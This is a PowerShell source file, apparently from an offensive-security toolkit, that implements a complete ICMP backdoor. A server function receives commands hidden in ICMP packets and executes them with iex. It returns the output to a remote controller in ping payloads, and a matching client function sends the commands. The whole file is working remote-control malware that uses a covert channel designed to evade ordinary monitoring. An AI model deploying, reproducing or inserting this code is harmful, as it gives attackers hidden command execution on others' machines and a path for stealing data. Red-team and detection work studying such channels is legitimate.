function Invoke-ICMPBackdoor
{
<#
.SYNOPSIS
This PowerShell function opens a backdoor that communicates over ICMP.

.DESCRIPTION
This PowerShell function opens a backdoor that communicates over ICMP.

Elevated privileges are required in order to create raw sockets.

.PARAMETER BindIP
Specify a local IP Address to bind to.

.EXAMPLE

PS > Invoke-ICMPBackdoor

Use above command to start an ICMP backdoor that will bind to the primary IP address.

.EXAMPLE

PS > Invoke-ICMPBackdoor -BindIP 192.168.1.1

Use above command to start an ICMP backdoor that will bind to the specified IP address 192.168.1.1.

.LINK
https://github.com/reigningshells

#>

	[CmdletBinding()] Param(
	
		[Parameter(Position = 0, Mandatory = $False)]
		[String]
		$BindIP
		
	)
	
	$source = @"
	using System;
	using System.Net;
	using System.Net.Sockets;

	public class ICMPServer
	{
		public static string getCommand(string bindIP)
		{
			Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Icmp);
				
			IPAddress localIP = IPAddress.Parse(bindIP);
			socket.Bind(new IPEndPoint(localIP, 0));
			byte[] value = BitConverter.GetBytes((Int32)3);
			socket.IOControl(IOControlCode.ReceiveAll, value, null);
			EndPoint clientEndPoint = new IPEndPoint(0, 0);
				
			byte[] buffer = new byte[2000];
			int readLen = socket.ReceiveFrom(buffer, ref clientEndPoint);
			return System.Text.Encoding.Default.GetString(buffer).Substring(28,1972).Trim('\0');
		}
		
	}
"@

	if (-not ([System.Management.Automation.PSTypeName]'ICMPServer').Type)
	{
		Add-Type -TypeDefinition $source -Language CSharp
	}
	
	if(!$BindIP)
	{
		$BindIP = Get-WmiObject Win32_NetworkAdapterConfiguration | Where {$_.IPEnabled -eq $True} | Select -Exp IPAddress -First 1 | Select -First 1
	}
	
	$cmd = ""
	$clientIP = $null

	Write-Output 'ICMP-Backdoor Started'
	
	while($cmd -ne 'exit')
	{
		try
		{
			$cmd = [ICMPServer]::getCommand($BindIP)
		}
		catch [System.Net.Sockets.SocketException]
		{
			Write-Output $_.Exception.Message
			Break
		}
		
		if($cmd.StartsWith('CONNECT: ')) 
		{
			$clientIP = $cmd.TrimStart('CONNECT: ')
			Write-Output "[*] Received connection request from $clientIP"
		}
		elseif($cmd.StartsWith('ICMP: ') -and $clientIP -ne $null)
		{	
			$cmd = $cmd.TrimStart('ICMP: ')
			Write-Output "[*] Received command: $cmd"
			
			#Sleep to give client time to setup listener for results
			Sleep -Seconds 2

			if($cmd -ne 'exit')
			{
				$result = iex $cmd -ErrorVariable e | Out-String
				$result = $result + $e

				Write-Output '[*] Sending result...'
				$count=0
				for($i = 0; $i -le $result.length; $i += 1000) 
				{
					if(($i+1000) -lt $result.length)
					{
						$chunk = $result.substring($i,1000)
					}
					else
					{
						$chunk = $result.substring($i,($result.length - $i))
					}

					Send-Ping -IPAddress $clientIP -Data "$count,$chunk" | Out-Null
					$count++
					Sleep 2
				}
				Send-Ping -IPAddress $clientIP -Data 'SERVER_OVER' | Out-Null
			}
			else
			{
				Sleep 2
				Send-Ping -IPAddress $clientIP -Data '0,ICMP-Backdoor closed' | Out-Null
				Sleep 2
				Send-Ping -IPAddress $clientIP -Data 'SERVER_OVER' | Out-Null
			}
		}
	}
	Write-Output 'Goodbye!'
}

function Send-ICMPCommand
{
<#
.SYNOPSIS
This PowerShell function sends a command to an ICMP backdoor and retrieves results.

.DESCRIPTION
This PowerShell function sends a command to an ICMP backdoor and retrieves results.

Elevated privileges are required in order to create raw sockets.

.PARAMETER ServerIP
Specify an IP address to communicate with.

.PARAMETER BindIP
Specify an IP address to bind to for receiving results.

.PARAMETER Command
Specify a command to execute on the remote system.

.EXAMPLE

PS > Send-ICMPCommand -BindIP 192.168.1.2 -ServerIP 192.168.1.1 -Command whoami

Use above command to send the "whoami" command to the ICMP backdoor at 192.168.1.1.

.LINK
https://github.com/reigningshells

#>

	[CmdletBinding()] Param(
	
		[Parameter(Position = 0, Mandatory = $True)]
		[String]
		$ServerIP,
		
		[Parameter(Position = 1, Mandatory = $False)]
		[String]
		$BindIP,
		
		[Parameter(Position = 2, Mandatory = $True)]
		[String]
		$Command
		
	)

	$source = @"
	using System;
	using System.Net;
	using System.Net.Sockets;

	public class ICMPClient
	{
		public static string getResults(string bindIP)
		{	
			Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Icmp);
			socket.ReceiveTimeout = 10000;
			
			IPAddress localIP = IPAddress.Parse(bindIP);
			socket.Bind(new IPEndPoint(localIP, 0));
			byte[] value = BitConverter.GetBytes((Int32)3);
			socket.IOControl(IOControlCode.ReceiveAll, value, null);
			EndPoint clientEndPoint = new IPEndPoint(0, 0);
			
			string line = System.String.Empty;
			string result = System.String.Empty;
			string previousLine = "none";
			
			while (line != "SERVER_OVER")
			{
				if(previousLine != line)
				{
					previousLine = line;
					if(line.Contains(","))
					{
						line = line.Substring(line.IndexOf(',') + 1);
						result += line;
					}
				}
				byte[] buffer = new byte[2000];
				int readLen = socket.ReceiveFrom(buffer, ref clientEndPoint);
				line = System.Text.Encoding.Default.GetString(buffer).Substring(28,1972).Trim('\0');
			}
			return result;
		}
	}
"@

	if (-not ([System.Management.Automation.PSTypeName]'ICMPClient').Type)
	{
		Add-Type -TypeDefinition $source -Language CSharp
	}
	
	#Select -First twice to handle IPv6
	if(!$BindIP)
	{
		$BindIP = Get-WmiObject Win32_NetworkAdapterConfiguration | Where {$_.IPEnabled -eq $True} | Select -Exp IPAddress -First 1 | Select -First 1
	}
	
	Write-Output "[*] Sending connect request to $ServerIP"
	if((Send-Ping -IPAddress $ServerIP -Data "CONNECT: $BindIP") -eq 'Success')
	{
		Sleep 2
	
		Write-Output "[*] Sending command: $command"
		Send-Ping -IPAddress $ServerIP -Data "ICMP: $command" | Out-Null
	
		Write-Output "[*] Receiving results..."
		try
		{
			$results = [ICMPClient]::getResults($BindIP)
		}
		catch [System.Net.Sockets.SocketException]
		{
			Write-Output $_.Exception.Message 
		}
		Write-Output $results
	}
	else
	{
		Write-Output "[*] Failed to communicate with $IPAddress over ICMP"
	}
}

function Send-Ping
{
<#
.SYNOPSIS
This PowerShell function sends a ping containing data.

.DESCRIPTION
This PowerShell function sends a ping containing data.

.PARAMETER IPAddress
Specify an IP address to ping.

.PARAMETER Data
Specify data to send via ICMP ping.

.EXAMPLE

PS > Send-Ping -IPAddress 192.168.1.1 -Data test

Use above command to send "test" in the data portion of an ICMP packet to 192.168.1.1.

.LINK
https://github.com/reigningshells

#>

	[CmdletBinding()] Param(
	
		[Parameter(Position = 0, Mandatory = $True)]
		[String]
		$IPAddress,
		
		[Parameter(Position = 1, Mandatory = $False)]
		[String]
		$Data="Test"
		
	)
	
	$Pinger = New-Object System.Net.NetworkInformation.Ping
	$PingOptions = New-Object System.Net.NetworkInformation.PingOptions
	$PingOptions.DontFragment = $True
	
	$sendbytes = ([text.encoding]::ASCII).GetBytes($data)
	$Pinger.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Select -exp Status
	
}
